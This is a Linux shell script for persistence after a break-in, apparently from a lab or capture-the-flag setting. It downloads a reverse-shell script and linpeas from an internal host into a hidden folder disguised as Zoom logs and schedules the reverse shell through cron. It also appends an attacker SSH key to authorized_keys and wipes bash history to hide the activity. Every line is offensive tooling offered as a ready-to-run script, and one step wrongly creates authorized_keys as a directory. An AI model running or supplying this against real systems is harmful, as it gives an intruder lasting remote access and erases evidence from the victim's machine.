#!/bin/sh

# Download scripts to obscure location
cd ~/.zoom/logs/
wget http://192.168.5.11:8000/victim/rev.sh
wget http://192.168.5.11:8000/victim/linpeas.sh

# Allow execution
chmod +x rev.sh
chmod +x linpeas.sh

# Add user cronjob
(crontab -l ; echo "* 6 * * * ~/.zoom/logs/rev.sh")|crontab 2> /dev/null

# Add ssh key
mkdir ~/.ssh
mkdir ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsaYMfynllFnvDF7H37hVv6l3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys

#echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDcjvUS2yFqXHbU0HDfXl1je3nDbsiZ0xdsTYKxKGTsgzPmW8It2d8D9d7KI9YUasAQcW47ZOCltrYvIQhBHUmXnP2845wOTNcCp7gtbyoFmuKqlnRPR7/nHKBTqfOnsLG5jov65KJFAxEfbA5UmiFJueE+QS2D/bCQbu0F2xak/H6tIHAWrP1PQZPhsa8YuyMgBxZh1AZx2zzPcyC1WQNYDemxA9oKMaN1OnjSrnv0nFdMBwcQLnvXxRFT1kFD1Z+Lfzp38SiSWsmkr/YR1xCbq9LTuj5SnayAiCpUMqYa8X3Eit9hP58caDdDQ5Qj+qaWBz4cUqq+amOaJTU5fhm+nbZTOe1h3xBqEFP4y7lNuCb9apklUJBXZ7ZeQOZx2SICebwWnrSOTrGisX04WjKiItw7iepcT2l64ONFF1vZJcQ9CQYtdhqyxqXh9p5/s/qgdNupOOgS+scyrmLrZKToq7BsR5y6sCHftXw8oNpwkBM0kNTn6zg85IFANLzmKbVwWUQVyA/Do6cvs/jDna4TFa+5+3gAdH+fEtJesGDmBEvdD86eQ+gm/Uahth9UCOXOM3qQPOj/t74g0zYRuIYfVDxBwKxfVuMIJj8bejl65nldvYc31RA3hvsZcWn5m79oRk5EmAVYrkRMQ34p8EbvtDUYc90+4wno5DfYKqSEBQ==" >> ~/.ssh/authorized_keys
#echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD4XWET4U7/cjkLSQRPOX3s1urmjAfSqxyLNd+U9lrqrEkXRGDM0RQpmjm/2uEsiFTRYYTjTaQm/1W4cFqKFO7NqkKH6OC0Oqdsrm+jz15zHWK1TR0FifTuVZCfK6nTIeQMBGv9jMRlUJjQuMfr52/lLG5OX+bDX1R07Z2rZy6dydVGyN1XyQDqT8RLlit7/Qrc6i4v04qLsFlqEQX2oqSpvfzJ4LOYtcAFPbMIUE3f0haaUy505kv1LKJC8to6US+Cqpte5LSrebnjEOY6U6LgWg+9kycTkvwSos+F5sThx//nBgDzBld6Ld0bgOLmWMYnRSZC86S46sZ+XV+TwhJvDlSJ4LE+LkYcYO5+c750PRO37yMvUzrUaR1VBKBeu++sDwA/GBLrmr0tpvWy/JHQA5798XMuJXgougfYI+KN+YgvqCyxWQbCz1kGsjhU5ZPfOeXIlRGw2zBIhZnn0p76wmBHZzh6Rv3qSLLabAHvFwcqmamSZ696EioA0KYe5Nk=" >> ~/.ssh/authorized_keys

# Delete bash history
echo "" > ~/.bash_history

echo "Done"
